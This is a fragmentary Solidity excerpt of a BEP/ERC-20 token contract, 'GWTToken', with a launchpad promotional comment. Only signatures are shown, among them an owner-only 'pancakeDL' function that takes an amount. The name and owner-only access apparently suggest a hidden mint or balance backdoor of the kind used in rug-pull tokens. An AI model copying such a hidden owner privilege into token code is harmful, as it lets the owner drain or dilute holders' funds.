...
// Safest Launchpad. Multi-Chain. Launching hand-picked high-quality projects on the Blockchain.
...
contract GWTToken is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _pancakeDL(address account, uint256 amount) internal virtual {
    ...
    function pancakeDL(uint256 amount) public onlyOwner virtual returns (bool) {
